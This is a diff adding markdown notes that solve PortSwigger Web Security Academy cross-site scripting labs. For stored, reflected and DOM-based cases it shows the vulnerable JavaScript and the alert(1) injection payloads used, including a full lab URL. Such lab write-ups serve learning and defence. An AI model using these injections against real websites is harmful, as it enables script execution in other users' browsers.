@@ -184,3 +184,56 @@ There are plenty more in: https://portswigger.net/web-security/cross-site-script
 
 
 ## Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
+
+The website part of the form allows javascript: scheme. Just add javascript:alert(1) to the website input of the comment form. 
+
+## Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
+
+This one is simple too - the vulnerable code is: 
+
+```js
+<script>
+    var searchTerms = 'aaaaa';
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+
+```
+we need to escape the single quotes and run a payload. A simple one is 
+
+```js
+'-alert(1)-'
+```
+
+## Lab: DOM XSS in document.write sink using source location.search inside a select element
+
+Vulnerable code:
+
+```js
+
+<script>
+    var stores = ["London","Paris","Milan"];
+    var store = (new URLSearchParams(window.location.search)).get('storeId');
+    document.write('<select name="storeId">');
+    if(store) {
+        document.write('<option selected>'+store+'</option>');
+    }
+    for(var i=0;i<stores.length;i++) {
+        if(stores[i] === store) {
+            continue;
+        }
+        document.write('<option>'+stores[i]+'</option>');
+    }
+    document.write('</select>');
+</script>
+```
+
+Just inserted <script>alert(1)</script> in the storeId parameter and it worked. I'm not sure why <img/src=x onerror=alert(1) /> wasn't being included in the DOM. 
+
+payload:
+
+```
+https://acd41f281e185016c0d1290100ce0074.web-security-academy.net/product?productId=2&storeId=%3Cscript%3Ealert(1)%3C/script%3E
+```
+
+## Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+
